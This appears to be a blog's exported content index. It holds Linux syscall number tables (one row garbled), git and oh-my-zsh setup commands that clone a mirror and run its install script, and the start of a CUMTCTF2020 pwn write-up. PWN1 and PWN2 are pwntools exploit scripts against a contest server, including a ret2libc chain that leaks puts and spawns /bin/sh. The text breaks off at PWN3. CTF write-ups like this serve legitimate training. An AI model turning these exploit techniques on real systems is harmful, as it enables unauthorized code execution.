<tr>\n<td>signalfd</td>\n<td>321</td>\n<td>timerfd_create</td>\n<td>322</td>\n</tr>\n<tr>\n<td>eventfd</td>\n<td>323</td>\n<td>fallocate</td>\n<td>324</td>\n</tr>\n<tr>\n<td>timerfd_settime</td>\n<td>325</td>\n<td>timerfd_gettime</td>\n<td>326</td>\n</tr>\n<tr>\n<td>signalfd4</td>\n<td>327</td>\n<td>eventfd2</td>\n<td>328</td>\n</tr>\n<tr>\n<td>epoll_create1</td>\n<td>329</td>\n<td>dup3</td>\n<td>330</td>\n</tr>\n<tr>\n<td>pipe2</td>\n<td>331</td>\n<td>inotify_init1</td>\n<td>332</td>\n</tr>\n<tr>\n<td>preadv</td>\n<td>333</td>\n<td>pwritev</td>\n<td>334</td>\n</tr>\n<tr>\n<td>rt_tgsigqueueinfo</td>\n<td>335</td>\n<td>perf_event_open</td>\n<td>336</td>\n</tr>\n<tr>\n<td>recvmmsg</td>\n<td>337</td>\n<td>fanotify_init</td>\n<td>338</td>\n</tr>\n<tr>\n<td>fanotify_mark</td>\n<td>339</td>\n<td>prlimit64</td>\n<td>340</td>\n</tr>\n<tr>\n<td>name_to_handle_at</td>\n<td>341</td>\n<td>open_by_handle_at</td>\n<td>342</td>\n</tr>\n<tr>\n<td>clock_adjtime</td>\n<td>343</td>\n<td>syncfs</td>\n<td>344</td>\n</tr>\n<tr>\n<td>sendmmsg</td>\n<td>345</td>\n<td>set_ns</td>\n<td>346</td>\n</tr>\n<tr>\n<td>process_vm_readv</td>\n<td>347</td>\n<td>process_vm_writev</td>\n<td>348</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h3 id=\"64\"><a href=\"#64\" class=\"headerlink\" title=\"64\"></a>64</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_64.h &gt; syscall.list</span><br></pre></td></tr></table></figure>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>read</td>\n<td>0</td>\n<td>write</td>\n<td>1</td>\n</tr>\n<tr>\n<td>open</td>\n<td>2</td>\n<td>close</td>\n<td>3</td>\n</tr>\n<tr>\n<td>stat</td>\n<td>4</td>\n<td>fstat</td>\n<td>5</td>\n</tr>\n<tr>\n<td>lstat</td>\n<td>6</td>\n<td>poll</td>\n<td>7</td>\n</tr>\n<tr>\n<td>lseek</td>\n<td>8</td>\n<td>mmap</td>\n<td>9</td>\n</tr>\n<tr>\n<td>mprotect</td>\n<td>10</td>\n<td>munmap</td>\n<td>11</td>\n</tr>\n<tr>\n<td>brk</td>\n<td>12</td>\n<td>rt_sigaction</td>\n<td>13</td>\n</tr>\n<tr>\n<td>rt_sigprocmask</td>\n<td>14</td>\n<td>rt_sigreturn</td>\n<td>15</td>\n</tr>\n<tr>\n<td>ioctl</td>\n<td>16</td>\n<td>pread64</td>\n<td>17</td>\n</tr>\n<tr>\n<td>pwrite64</td>\n<td>18</td>\n<td>readv</td>\n<td>19</td>\n</tr>\n<tr>\n<td>writev</td>\n<td>20</td>\n<td>access</td>\n<td>21</td>\n</tr>\n<tr>\n<td>pipe</td>\n<td>22</td>\n<td>select</td>\n<td>23</td>\n</tr>\n<tr>\n<td>sched_yield</td>\n<td>24</td>\n<td>mremap</td>\n<td>25</td>\n</tr>\n<tr>\n<td>msync</td>\n<td>26</td>\n<td>mincore</td>\n<td>27</td>\n</tr>\n<tr>\n<td>madvise</td>\n<td>28</td>\n<td>shmget</td>\n<td>29</td>\n</tr>\n<tr>\n<td>shmat</td>\n<td>30</td>\n<td>shmctl</td>\n<td>31</td>\n</tr>\n<tr>\n<td>dup</td>\n<td>32</td>\n<td>dup2</td>\n<td>33</td>\n</tr>\n<tr>\n<td>pause</td>\n<td>34</td>\n<td>nanosleep</td>\n<td>35</td>\n</tr>\n<tr>\n<td>getitimer</td>\n<td>36</td>\n<td>alarm</td>\n<td>37</td>\n</tr>\n<tr>\n<td>setitimer</td>\n<td>38</td>\n<td>getpid</td>\n<td>39</td>\n</tr>\n<tr>\n<td>sendfile</td>\n<td>40</td>\n<td>socket</td>\n<td>41</td>\n</tr>\n<tr>\n<td>connect</td>\n<td>42</td>\n<td>accept</td>\n<td>43</td>\n</tr>\n<tr>\n<td>sendto</td>\n<td>44</td>\n<td>recvfrom</td>\n<td>45</td>\n</tr>\n<tr>\n<td>sendmsg</td>\n<td>46</td>\n<td>recvmsg</td>\n<td>47</td>\n</tr>\n<tr>\n<td>shutdown</td>\n<td>48</td>\n<td>bind</td>\n<td>49</td>\n</tr>\n<tr>\n<td>listen</td>\n<td>50</td>\n<td>getsockname</td>\n<td>51</td>\n</tr>\n<tr>\n<td>getpeername</td>\n<td>52</td>\n<td>socketpair</td>\n<td>53</td>\n</tr>\n<tr>\n<td>setsockopt</td>\n<td>54</td>\n<td>getsockopt</td>\n<td>55</td>\n</tr>\n<tr>\n<td>clone</td>\n<td>56</td>\n<td>fork</td>\n<td>57</td>\n</tr>\n<tr>\n<td>vfork</td>\n<td>58</td>\n<td>execve</td>\n<td>59</td>\n</tr>\n<tr>\n<td>exit</td>\n<td>60</td>\n<td>wait4</td>\n<td>61</td>\n</tr>\n<tr>\n<td>kill</td>\n<td>62</td>\n<td>uname</td>\n<td>63</td>\n</tr>\n<tr>\n<td>semget</td>\n<td>64</td>\n<td>semop</td>\n<td>65</td>\n</tr>\n<tr>\n<td>semctl</td>\n<td>66</td>\n<td>shmdt</td>\n<td>67</td>\n</tr>\n<tr>\n<td>msgget</td>\n<td>68</td>\n<td>msgsnd</td>\n<td>69</td>\n</tr>\n<tr>\n<td>msgrcv</td>\n<td>70</td>\n<td>msgctl</td>\n<td>71</td>\n</tr>\n<tr>\n<td>fcntl</td>\n<td>72</td>\n<td>flock</td>\n<td>73</td>\n</tr>\n<tr>\n<td>fsync</td>\n<td>74</td>\n<td>fdatasync</td>\n<td>75</td>\n</tr>\n<tr>\n<td>truncate</td>\n<td>76</td>\n<td>ftruncate</td>\n<td>77</td>\n</tr>\n<tr>\n<td>getdents</td>\n<td>78</td>\n<td>getcwd</td>\n<td>79</td>\n</tr>\n<tr>\n<td>chdir</td>\n<td>80</td>\n<td>fchdir</td>\n<td>81</td>\n</tr>\n<tr>\n<td>rename</td>\n<td>82</td>\n<td>mkdir</td>\n<td>83</td>\n</tr>\n<tr>\n<td>rmdir</td>\n<td>84</td>\n<td>creat</td>\n<td>85</td>\n</tr>\n<tr>\n<td>link</td>\n<td>86</td>\n<td>unlink</td>\n<td>87</td>\n</tr>\n<tr>\n<td>symlink</td>\n<td>88</td>\n<td>readlink</td>\n<td>89</td>\n</tr>\n<tr>\n<td>chmod</td>\n<td>90</td>\n<td>fchmod</td>\n<td>91</td>\n</tr>\n<tr>\n<td>chown</td>\n<td>92</td>\n<td>fchown</td>\n<td>93</td>\n</tr>\n<tr>\n<td>lchown</td>\n<td>94</td>\n<td>umask</td>\n<td>95</td>\n</tr>\n<tr>\n<td>gettimeofday</td>\n<td>96</td>\n<td>getrlimit</td>\n<td>97</td>\n</tr>\n<tr>\n<td>getrusage</td>\n<td>98</td>\n<td>sysinfo</td>\n<td>99</td>\n</tr>\n<tr>\n<td>times</td>\n<td>100</td>\n<td>ptrace</td>\n<td>101</td>\n</tr>\n<tr>\n<td>getuid</td>\n<td>102</td>\n<td>syslog</td>\n<td>103</td>\n</tr>\n<tr>\n<td>getgid</td>\n<td>104</td>\n<td>setuid</td>\n<td>105</td>\n</tr>\n<tr>\n<td>setgid</td>\n<td>106</td>\n<td>geteuid</td>\n<td>107</td>\n</tr>\n<tr>\n<td>getegid</td>\n<td>108</td>\n<td>setpgid</td>\n<td>109</td>\n</tr>\n<tr>\n<td>getppid</td>\n<td>110</td>\n<td>getpgrp</td>\n<td>111</td>\n</tr>\n<tr>\n<td>setsid</td>\n<td>112</td>\n<td>setreuid</td>\n<td>113</td>\n</tr>\n<tr>\n<td>setregid</td>\n<td>114</td>\n<td>getgroups</td>\n<td>115</td>\n</tr>\n<tr>\n<td>setgroups</td>\n<td>116</td>\n<td>setresuid</td>\n<td>117</td>\n</tr>\n<tr>\n<td>getresuid</td>\n<td>118</td>\n<td>setresgid</td>\n<td>119</td>\n</tr>\n<tr>\n<td>getresgid</td>\n<td>120</td>\n<td>getpgid</td>\n<td>121</td>\n</tr>\n<tr>\n<td>setfsuid</td>\n<td>122</td>\n<td>setfsgid</td>\n<td>123</td>\n</tr>\n<tr>\n<td>getsid</td>\n<td>124</td>\n<td>capget</td>\n<td>125</td>\n</tr>\n<tr>\n<td>capset</td>\n<td>126</td>\n<td>rt_sigpending</td>\n<td>127</td>\n</tr>\n<tr>\n<td>rt_sigtimedwait</td>\n<td>128</td>\n<td>rt_sigqueueinfo</td>\n<td>129</td>\n</tr>\n<tr>\n<td>rt_sigsuspend</td>\n<td>130</td>\n<td>sigaltstack</td>\n<td>131</td>\n</tr>\n<tr>\n<td>utime</td>\n<td>132</td>\n<td>mknod</td>\n<td>133</td>\n</tr>\n<tr>\n<td>uselib</td>\n<td>13</td>\n<td>4personality</td>\n<td>135</td>\n</tr>\n<tr>\n<td>ustat</td>\n<td>136</td>\n<td>statfs</td>\n<td>137</td>\n</tr>\n<tr>\n<td>fstatfs</td>\n<td>138</td>\n<td>sysfs</td>\n<td>139</td>\n</tr>\n<tr>\n<td>getpriority</td>\n<td>140</td>\n<td>setpriority</td>\n<td>141</td>\n</tr>\n<tr>\n<td>sched_setparam</td>\n<td>142</td>\n<td>sched_getparam</td>\n<td>143</td>\n</tr>\n<tr>\n<td>sched_setscheduler</td>\n<td>144</td>\n<td>sched_getscheduler</td>\n<td>145</td>\n</tr>\n<tr>\n<td>sched_get_priority_max</td>\n<td>146</td>\n<td>sched_get_priority_min</td>\n<td>147</td>\n</tr>\n<tr>\n<td>sched_rr_get_interval</td>\n<td>148</td>\n<td>mlock</td>\n<td>149</td>\n</tr>\n<tr>\n<td>munlock</td>\n<td>150</td>\n<td>mlockall</td>\n<td>151</td>\n</tr>\n<tr>\n<td>munlockall</td>\n<td>152</td>\n<td>vhangup</td>\n<td>153</td>\n</tr>\n<tr>\n<td>modify_ldt</td>\n<td>154</td>\n<td>pivot_root</td>\n<td>155</td>\n</tr>\n<tr>\n<td>_sysctl</td>\n<td>156</td>\n<td>prctl</td>\n<td>157</td>\n</tr>\n<tr>\n<td>arch_prctl</td>\n<td>158</td>\n<td>adjtimex</td>\n<td>159</td>\n</tr>\n<tr>\n<td>setrlimit</td>\n<td>160</td>\n<td>chroot</td>\n<td>161</td>\n</tr>\n<tr>\n<td>sync</td>\n<td>162</td>\n<td>acct</td>\n<td>163</td>\n</tr>\n<tr>\n<td>settimeofday</td>\n<td>164</td>\n<td>mount</td>\n<td>165</td>\n</tr>\n<tr>\n<td>umount2</td>\n<td>166</td>\n<td>swapon</td>\n<td>167</td>\n</tr>\n<tr>\n<td>swapoff</td>\n<td>168</td>\n<td>reboot</td>\n<td>169</td>\n</tr>\n<tr>\n<td>sethostname</td>\n<td>170</td>\n<td>setdomainname</td>\n<td>171</td>\n</tr>\n<tr>\n<td>iopl</td>\n<td>172</td>\n<td>ioperm</td>\n<td>173</td>\n</tr>\n<tr>\n<td>create_module</td>\n<td>174</td>\n<td>init_module</td>\n<td>175</td>\n</tr>\n<tr>\n<td>delete_module</td>\n<td>176</td>\n<td>get_kernel_syms</td>\n<td>177</td>\n</tr>\n<tr>\n<td>query_module</td>\n<td>178</td>\n<td>quotactl</td>\n<td>179</td>\n</tr>\n<tr>\n<td>nfsservctl</td>\n<td>180</td>\n<td>getpmsg</td>\n<td>181</td>\n</tr>\n<tr>\n<td>putpmsg</td>\n<td>182</td>\n<td>afs_syscall</td>\n<td>183</td>\n</tr>\n<tr>\n<td>tuxcall</td>\n<td>184</td>\n<td>security</td>\n<td>185</td>\n</tr>\n<tr>\n<td>gettid</td>\n<td>186</td>\n<td>readahead</td>\n<td>187</td>\n</tr>\n<tr>\n<td>setxattr</td>\n<td>188</td>\n<td>lsetxattr</td>\n<td>189</td>\n</tr>\n<tr>\n<td>fsetxattr</td>\n<td>190</td>\n<td>getxattr</td>\n<td>191</td>\n</tr>\n<tr>\n<td>lgetxattr</td>\n<td>192</td>\n<td>fgetxattr</td>\n<td>193</td>\n</tr>\n<tr>\n<td>listxattr</td>\n<td>194</td>\n<td>llistxattr</td>\n<td>195</td>\n</tr>\n<tr>\n<td>flistxattr</td>\n<td>196</td>\n<td>removexattr</td>\n<td>197</td>\n</tr>\n<tr>\n<td>lremovexattr</td>\n<td>198</td>\n<td>fremovexattr</td>\n<td>199</td>\n</tr>\n<tr>\n<td>tkill</td>\n<td>200</td>\n<td>time</td>\n<td>201</td>\n</tr>\n<tr>\n<td>futex</td>\n<td>202</td>\n<td>sched_setaffinity</td>\n<td>203</td>\n</tr>\n<tr>\n<td>sched_getaffinity</td>\n<td>204</td>\n<td>set_thread_area</td>\n<td>205</td>\n</tr>\n<tr>\n<td>io_setup</td>\n<td>206</td>\n<td>io_destroy</td>\n<td>207</td>\n</tr>\n<tr>\n<td>io_getevents</td>\n<td>208</td>\n<td>io_submit</td>\n<td>209</td>\n</tr>\n<tr>\n<td>io_cancel</td>\n<td>210</td>\n<td>get_thread_area</td>\n<td>211</td>\n</tr>\n<tr>\n<td>lookup_dcookie</td>\n<td>212</td>\n<td>epoll_create</td>\n<td>213</td>\n</tr>\n<tr>\n<td>epoll_ctl_old</td>\n<td>214</td>\n<td>epoll_wait_old</td>\n<td>215</td>\n</tr>\n<tr>\n<td>remap_file_pages</td>\n<td>216</td>\n<td>getdents64</td>\n<td>217</td>\n</tr>\n<tr>\n<td>set_tid_address</td>\n<td>218</td>\n<td>restart_syscall</td>\n<td>219</td>\n</tr>\n<tr>\n<td>semtimedop</td>\n<td>220</td>\n<td>fadvise64</td>\n<td>221</td>\n</tr>\n<tr>\n<td>timer_create</td>\n<td>222</td>\n<td>timer_settime</td>\n<td>223</td>\n</tr>\n<tr>\n<td>timer_gettime</td>\n<td>224</td>\n<td>timer_getoverrun</td>\n<td>225</td>\n</tr>\n<tr>\n<td>timer_delete</td>\n<td>226</td>\n<td>clock_settime</td>\n<td>227</td>\n</tr>\n<tr>\n<td>clock_gettime</td>\n<td>228</td>\n<td>clock_getres</td>\n<td>229</td>\n</tr>\n<tr>\n<td>clock_nanosleep</td>\n<td>230</td>\n<td>exit_group</td>\n<td>231</td>\n</tr>\n<tr>\n<td>epoll_wait</td>\n<td>232</td>\n<td>epoll_ctl</td>\n<td>233</td>\n</tr>\n<tr>\n<td>tgkill</td>\n<td>234</td>\n<td>utimes</td>\n<td>235</td>\n</tr>\n<tr>\n<td>vserver</td>\n<td>236</td>\n<td>mbind</td>\n<td>237</td>\n</tr>\n<tr>\n<td>set_mempolicy</td>\n<td>238</td>\n<td>get_mempolicy</td>\n<td>239</td>\n</tr>\n<tr>\n<td>mq_open</td>\n<td>240</td>\n<td>mq_unlink</td>\n<td>241</td>\n</tr>\n<tr>\n<td>mq_timedsend</td>\n<td>242</td>\n<td>mq_timedreceive</td>\n<td>243</td>\n</tr>\n<tr>\n<td>mq_notify</td>\n<td>244</td>\n<td>mq_getsetattr</td>\n<td>245</td>\n</tr>\n<tr>\n<td>kexec_load</td>\n<td>246</td>\n<td>waitid</td>\n<td>247</td>\n</tr>\n<tr>\n<td>add_key</td>\n<td>248</td>\n<td>request_key</td>\n<td>249</td>\n</tr>\n<tr>\n<td>keyctl</td>\n<td>250</td>\n<td>ioprio_set</td>\n<td>251</td>\n</tr>\n<tr>\n<td>ioprio_get</td>\n<td>252</td>\n<td>inotify_init</td>\n<td>253</td>\n</tr>\n<tr>\n<td>inotify_add_watch</td>\n<td>254</td>\n<td>inotify_rm_watch</td>\n<td>255</td>\n</tr>\n<tr>\n<td>migrate_pages</td>\n<td>256</td>\n<td>openat</td>\n<td>257</td>\n</tr>\n<tr>\n<td>mkdirat</td>\n<td>258</td>\n<td>mknodat</td>\n<td>259</td>\n</tr>\n<tr>\n<td>fchownat</td>\n<td>260</td>\n<td>futimesat</td>\n<td>261</td>\n</tr>\n<tr>\n<td>newfstatat</td>\n<td>262</td>\n<td>unlinkat</td>\n<td>263</td>\n</tr>\n<tr>\n<td>renameat</td>\n<td>264</td>\n<td>linkat</td>\n<td>265</td>\n</tr>\n<tr>\n<td>symlinkat</td>\n<td>266</td>\n<td>readlinkat</td>\n<td>267</td>\n</tr>\n<tr>\n<td>fchmodat</td>\n<td>268</td>\n<td>faccessat</td>\n<td>269</td>\n</tr>\n<tr>\n<td>pselect6</td>\n<td>270</td>\n<td>ppoll</td>\n<td>271</td>\n</tr>\n<tr>\n<td>unshare</td>\n<td>272</td>\n<td>set_robust_list</td>\n<td>273</td>\n</tr>\n<tr>\n<td>get_robust_list</td>\n<td>274</td>\n<td>splice</td>\n<td>275</td>\n</tr>\n<tr>\n<td>tee</td>\n<td>276</td>\n<td>sync_file_range</td>\n<td>277</td>\n</tr>\n<tr>\n<td>vmsplice</td>\n<td>278</td>\n<td>move_pages</td>\n<td>279</td>\n</tr>\n<tr>\n<td>utimensat</td>\n<td>280</td>\n<td>epoll_pwait</td>\n<td>281</td>\n</tr>\n<tr>\n<td>signalfd</td>\n<td>282</td>\n<td>timerfd_create</td>\n<td>283</td>\n</tr>\n<tr>\n<td>eventfd</td>\n<td>284</td>\n<td>fallocate</td>\n<td>285</td>\n</tr>\n<tr>\n<td>timerfd_settime</td>\n<td>286</td>\n<td>timerfd_gettime</td>\n<td>287</td>\n</tr>\n<tr>\n<td>accept4</td>\n<td>288</td>\n<td>signalfd4</td>\n<td>289</td>\n</tr>\n<tr>\n<td>eventfd2</td>\n<td>290</td>\n<td>epoll_create1</td>\n<td>291</td>\n</tr>\n<tr>\n<td>dup3</td>\n<td>292</td>\n<td>pipe2</td>\n<td>293</td>\n</tr>\n<tr>\n<td>inotify_init1</td>\n<td>294</td>\n<td>preadv</td>\n<td>295</td>\n</tr>\n<tr>\n<td>pwritev</td>\n<td>296</td>\n<td>rt_tgsigqueueinfo</td>\n<td>297</td>\n</tr>\n<tr>\n<td>perf_event_open</td>\n<td>298</td>\n<td>recvmmsg</td>\n<td>299</td>\n</tr>\n<tr>\n<td>fanotify_init</td>\n<td>300</td>\n<td>fanotify_mark</td>\n<td>301</td>\n</tr>\n<tr>\n<td>prlimit64</td>\n<td>302</td>\n<td>name_to_handle_at</td>\n<td>303</td>\n</tr>\n<tr>\n<td>open_by_handle_at</td>\n<td>304</td>\n<td>clock_adjtime</td>\n<td>305</td>\n</tr>\n<tr>\n<td>syncfs</td>\n<td>306</td>\n<td>sendmmsg</td>\n<td>307</td>\n</tr>\n<tr>\n<td>set_ns</td>\n<td>308</td>\n<td>get_cpu</td>\n<td>309</td>\n</tr>\n<tr>\n<td>process_vm_readv</td>\n<td>310</td>\n<td>process_vm_writev</td>\n<td>311</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h2 id=\"3-git\"><a href=\"#3-git\" class=\"headerlink\" title=\"3.git\"></a>3.git</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add *</span><br><span class=\"line\">git remote add origin git@github.com:Pz1o&#x2F;My-PWN.git</span><br><span class=\"line\"></span><br><span class=\"line\">git pull --rebase origin master</span><br><span class=\"line\">git push -u origin master</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-zsh\"><a href=\"#4-zsh\" class=\"headerlink\" title=\"4.zsh\"></a>4.zsh</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install git -y &amp;&amp; git clone https:&#x2F;&#x2F;gitee.com&#x2F;JonahXie&#x2F;oh-my-zsh.git &amp;&amp; .&#x2F;oh-my-zsh&#x2F;tools&#x2F;install.sh</span><br><span class=\"line\">&#x2F;&#x2F;install.sh</span><br><span class=\"line\">&#x2F;&#x2F; https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;robbyrussell&#x2F;oh-my-zsh.git</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">vim .&#x2F;.zshrc</span><br><span class=\"line\">plugins&#x3D;(git</span><br><span class=\"line\">zsh-autosuggestions</span><br><span class=\"line\">zsh-syntax-highlighting</span><br><span class=\"line\">)</span><br><span class=\"line\">git clone https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions.git &#x2F;home&#x2F;ubuntu&#x2F;oh-my-zsh&#x2F;custom&#x2F;plugins&#x2F;zsh-autosuggestions</span><br><span class=\"line\">git clone https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-syntax-highlighting.git &#x2F;home&#x2F;ubuntu&#x2F;oh-my-zsh&#x2F;custom&#x2F;plugins&#x2F;zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;agnoster</span><br><span class=\"line\">sudo apt-get install fonts-powerline</span><br><span class=\"line\">&#x2F;&#x2F;random</span><br></pre></td></tr></table></figure>\n<h2 id=\"5-\"><a href=\"#5-\" class=\"headerlink\" title=\"5.\"></a>5.</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo &#x2F;etc&#x2F;init.d&#x2F;bt default</span><br></pre></td></tr></table></figure>\n<h2 id=\"6-directorylister\"><a href=\"#6-directorylister\" class=\"headerlink\" title=\"6.directorylister\"></a>6.directorylister</h2><p>php7.2</p>\n<p></p>\n<p>[][<a href=\"https://www.directorylister.com/]\" target=\"_blank\" rel=\"noopener\">https://www.directorylister.com/]</a></p>\n<p>[][<a href=\"https://blog.chrxw.com/archives/2020/09/21/1401.html]\" target=\"_blank\" rel=\"noopener\">https://blog.chrxw.com/archives/2020/09/21/1401.html]</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">opcache</span><br><span class=\"line\">&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id><a href=\"#\" class=\"headerlink\" title=\" \"></a> </h2>","categories":["linux"],"tags":["linux"]},{"title":"CUMTCTF2020","url":"https://pz1o.top/2020/12/26/CUMTCTF2020/","content":"<h1 id=\"CUMTCTF2020\"><a href=\"#CUMTCTF2020\" class=\"headerlink\" title=\"CUMTCTF2020\"></a>CUMTCTF2020</h1><p></p>\n<p><img src=\"/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/image-20201226220723157.png\" alt=\"image-20201226220723157\"></p>\n<p>PWN</p>\n<p></p>\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><h2 id=\"PWN1\"><a href=\"#PWN1\" class=\"headerlink\" title=\"PWN1\"></a>PWN1</h2><p>\\x00</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn1\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b\"\\x00\"</span>*<span class=\"number\">7</span> + p32(<span class=\"number\">123</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN2\"><a href=\"#PWN2\" class=\"headerlink\" title=\"PWN2\"></a>PWN2</h2><p>1puts</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import LibcSearcher</span></span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">'219.219.61.234'</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\"><span class=\"comment\">#r = process(\"./pwn2\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./pwn2'</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</span><br><span class=\"line\"><span class=\"comment\">#context(arch=\"i386\",os=\"linux\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">'\\x00'</span>*<span class=\"number\">7</span> + <span class=\"string\">'\\xff'</span></span><br><span class=\"line\">r.sendline(payload1)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"you_really_know_random_haha\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">put_plt = elf.plt[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">put_got = elf.got[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">main = <span class=\"number\">0x80486D3</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x6c</span>+<span class=\"number\">0x4</span>) + p32(put_plt) + p32(main) + p32(put_got)</span><br><span class=\"line\">r.sendline(payload2)</span><br><span class=\"line\">print(r.recv())</span><br><span class=\"line\">put = u32(r.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\">print(hex(put))</span><br><span class=\"line\"><span class=\"comment\">#libc = LibcSearcher('puts',put)</span></span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = put - libc.symbols[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">system = libcbase + libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">print(hex(binsh))</span><br><span class=\"line\">sh = libcbase + binsh</span><br><span class=\"line\">payload1 = <span class=\"string\">b'\\x00'</span>*<span class=\"number\">7</span> + <span class=\"string\">b'\\xff'</span></span><br><span class=\"line\">r.sendline(payload1)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"you_really_know_random_haha\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">print(r.recv())</span><br><span class=\"line\">payload3 = <span class=\"string\">b\"A\"</span>*(<span class=\"number\">0x6c</span>+<span class=\"number\">4</span>) + p32(system) + p32(<span class=\"number\">0</span>) + p32(sh)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(payload3)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN3\"><a href=\"#PWN3\" class=\"headerlink\" title=\"PWN3\"></a>PWN3</h2><p>UAF</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span 